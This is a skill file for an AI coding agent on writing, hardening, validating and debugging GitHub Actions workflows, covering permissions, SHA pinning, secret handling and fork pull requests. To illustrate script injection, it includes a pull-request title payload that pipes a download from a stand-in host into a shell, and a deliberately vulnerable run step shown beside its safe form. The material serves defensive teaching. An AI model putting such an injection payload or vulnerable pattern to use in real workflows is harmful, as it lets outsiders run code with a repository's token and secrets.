---
name: github-actions
description: Writes, changes and debugs GitHub Actions workflows (CI for tests, lint and builds, scheduled jobs, deploys, tag-triggered releases). Starts from how the repo already builds and tests, writes the smallest workflow that proves value, hardens it (least-privilege permissions, actions pinned to commit SHAs, no script injection, safe handling of secrets and fork PRs), validates it before pushing, then watches the run and fixes the real cause of any failure. Use when the user invokes /github-actions, asks to add or set up CI/CD, a pipeline, a workflow or automated checks, wants a failing or slow Actions run diagnosed, or whenever a task touches a file under .github/workflows, even if GitHub Actions is never named.
---

# GitHub Actions

A workflow file is shared infrastructure. It runs on every contributor's
push, holds the repository's token and secrets, and blocks every merge when
it is wrong. So: read the repo first, start small, harden what gets written,
prove it runs, and ship it through a pull request people can review.

## Look before writing

```bash
ls .github/workflows/ .github/actions/ .github/dependabot.yml 2>/dev/null
gh api repos/{owner}/{repo} --jq .default_branch   # gh fills {owner}/{repo}
gh pr checks <recent-pr-number> --required         # what gates merging today
```

- **Existing workflows are the convention.** Match their naming, runner,
  pinning and caching. Add a job to an existing workflow before creating a
  file that repeats checkout and install.
- **Find the commands people really run** (`package.json` scripts, Makefile,
  tox/nox, CONTRIBUTING), run them locally, and have CI call those same
  entry points. A workflow with its own private test invocation drifts away
  from what developers run.
- **Take tool versions from the repo's own files** (`.nvmrc`,
  `.python-version`, `go.mod`) through the setup action's `*-version-file`
  input. Quote a version written inline: unquoted `3.10` is the number 3.1.
- **Know what gates merging.** Required checks match on job name. A renamed
  job, or a required workflow skipped by a `paths:` or `branches:` filter,
  leaves every PR waiting on a check that never reports. With a merge queue,
  required workflows also need the `merge_group` trigger.

## Start with the smallest useful workflow

One job, running checks that already pass locally, on pull requests and the
default branch. A matrix, coverage upload, deploys and bots each come later
as their own reviewable change.

```yaml
name: CI

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@<40-char-commit-sha> # vX.Y.Z
        with:
          persist-credentials: false
      - uses: actions/setup-node@<40-char-commit-sha> # vX.Y.Z
        with:
          node-version-file: .nvmrc
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npm test
```

- **Triggers**: `pull_request` plus `push` to the default branch only. A
  bare `on: push` runs twice for every PR branch. Add `workflow_dispatch`
  (manual) or `schedule` (cron, in UTC) when the job calls for it; both work
  only once the file is on the default branch. For version tags see
  `github-releases`.
- **`permissions`**: naming one permission sets all others to none, so the
  top-level `contents: read` is the whole grant. A job that needs more
  (`contents: write` for a release, `pull-requests: write` to comment,
  `id-token: write` for OIDC) gets its own block. That block replaces the
  top-level one, so repeat `contents: read` in it.
- **`persist-credentials: false`**: checkout otherwise leaves the token in
  the git config for every later step. Drop it only in a job that pushes.
- **`concurrency`**: cancels a PR's superseded runs and lets default-branch
  runs finish. Never cancel a deploy or release halfway.
- **`timeout-minutes`**: the default is 360, so one hung test burns six
  hours. Set two to three times the normal duration.
- **`cache:`** on the setup action covers dependency caching. **No matrix**
  until the project claims support for several versions or systems; each
  cell is a full run.

## Pin actions to a commit SHA

A tag can be repointed: whoever controls an action's repository, or breaks
into it, can move `v4` to new code that then runs with the workflow's token
and secrets. A full commit SHA cannot move. Pin every action from another
repository, GitHub's own `actions/*` included; one rule is easier to audit
than two.

Version numbers from memory are stale. Look them up each time:

```bash
gh api repos/OWNER/REPO/releases/latest --jq .tag_name   # e.g. v1.2.3
git ls-remote https://github.com/OWNER/REPO 'refs/tags/v1.2.3' 'refs/tags/v1.2.3^{}'
```

If a second line ending in `^{}` is printed, the tag is annotated and that
line holds the commit: use it, not the tag object above it. Without `gh`,
list tags with `git ls-remote --sort=-v:refname --tags <url> 'v*' | head`.
Resolve against the action's own repository, never a fork, and skim the
release notes when the major version is newer than the one the repo used.

Write `uses: OWNER/REPO@<sha> # v1.2.3`. With the version on the same line,
Dependabot updates SHA and comment together. A pin never updates itself and
gets no Dependabot security alerts, so check that `.github/dependabot.yml`
has a `package-ecosystem: github-actions` entry and add one if not.

Exception: a repo with `.github/workflows/actions.lock` uses GitHub's
workflow dependency lockfile. Keep `uses:` on readable version tags there,
run `gh actions-lock` after changing any, and never edit the lockfile by
hand. Adopting a lockfile is the owner's call: propose it, don't introduce
it.

## Untrusted input and secrets

`${{ }}` expressions are pasted into a `run:` script as text before the
shell starts, so a pull request titled `"; curl evil.example | sh; "`
becomes code. Anything an outsider can type is untrusted: PR and issue
titles and bodies, comments, labels, branch names (`github.head_ref`),
commit messages, author names. Pass those to the script as data:

```yaml
# vulnerable: the title becomes part of the script
- run: echo "Checking ${{ github.event.pull_request.title }}"

# safe: the title arrives in a variable the shell never parses as code
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Checking $TITLE"
```

Secrets go into the `env:` of the one step that uses them; set job-wide,
every step and action in the job can read them. Keep them out of the log
(no `echo`, `set -x` or `env` dump): masking matches the exact value only,
so a base64 or JSON-wrapped copy prints in clear. Prefer OIDC (`id-token:
write`) to a stored long-lived key where the provider supports it. The
agent cannot set secret values, so name the secrets the workflow expects in
the PR for the owner to add.

A PR from a fork gets a read-only token and no secrets under
`pull_request`. That is the protection working. Skip the steps that need
secrets for forks instead of reaching for a privileged trigger:
`pull_request_target`, `workflow_run` and `issue_comment` run with the base
repository's secrets and a write-capable token on events an outsider can
cause. Never run fork code where those are in reach. Read
`references/privileged-triggers.md` before using any of the three, or when
asked to give fork PRs access to secrets.

## Validate before pushing

A broken workflow fails only after the push, in front of everyone. Run
`actionlint` from the repo root: it checks syntax, expressions, runner
labels, inputs of common actions and, with `shellcheck` installed, the
`run:` scripts. Install it with `go install
github.com/rhysd/actionlint/cmd/actionlint@latest`, `brew install
actionlint`, or the download script in its README.

Without it, at least prove the file parses (`yq . FILE`, or `python3 -c
'import sys,yaml; yaml.safe_load(open(sys.argv[1]))' FILE`) and say in the
PR that actionlint was not run. PyYAML loads the `on:` key as boolean
`True`; that is a YAML 1.1 quirk, not a defect.

## Verify after pushing

The work is done when a run has passed, not when the file is committed.

```bash
git push -u origin <branch>
gh run list --branch <branch> --limit 5         # run id; appears after a few seconds
gh run watch <run-id> --exit-status --compact   # blocks; non-zero on failure
gh run view <run-id> --log-failed > /tmp/ci.log 2>&1
grep -n -i -m 20 'error\|fail' /tmp/ci.log      # grep the log, don't dump it
```

- **No run appeared?** Likeliest first: a branch or path filter doesn't
  match; the trigger is `workflow_dispatch` or `schedule` and the file is
  not on the default branch yet; the file is invalid (the Actions tab shows
  it by path with the error); Actions is disabled or a first-time
  contributor awaits approval; the push came from a workflow's own
  `GITHUB_TOKEN`, which starts no new runs.
- **Can't be triggered from a PR** (tag, schedule, dispatch)? Add a
  temporary `pull_request` trigger with the publishing steps guarded by
  `if:`, and remove it before merging.
- **Failed?** Read the failing step's log, reproduce locally, fix the cause,
  push again. A frequent clean-runner difference is the shallow clone:
  history-based tools need `fetch-depth: 0`.
- **Push rejected over the `workflow` scope?** The token may not modify
  workflow files. Tell the user (`gh auth refresh -s workflow`, or the
  Workflows permission on a fine-grained token) rather than route around it.

Green has to mean the checks passed. Do not get there with
`continue-on-error`, `|| true`, `if: false`, a deleted or skipped test,
loosened lint rules, or a filter that keeps the failing job from running.
If a check already fails on the default branch, or is flaky (confirm with
one `gh run rerun <run-id> --failed`), say so and let the user decide. A
visible failure is the honest result.

## Ship it through a draft PR

A workflow changes how everyone on the repo works: new waits, new ways to
fail, new spend. Open a draft PR instead of pushing to the default branch;
it is also where a `pull_request` workflow first proves itself. Write the
description with `github-docs` so that a reviewer learns, without reading
YAML: what triggers the workflow and what it now blocks; the permissions,
secrets and actions it brings in; what the owner must set up by hand
(secrets, required checks, environments); how to run the same checks
locally; and a link to a passing run.

## Related skills

- `github-releases`: versioning, tagging and publishing. Its reference file
  has a tag-triggered release workflow to build on.
- `github-docs`: the PR description and README changes, scaled to how many
  people the workflow affects.
- `github-lookup`: find an existing action or starter workflow (GitHub's
  `actions/starter-workflows`) before writing a custom one.
- `lean-output`: CI logs are long. Send them to a file and grep them.
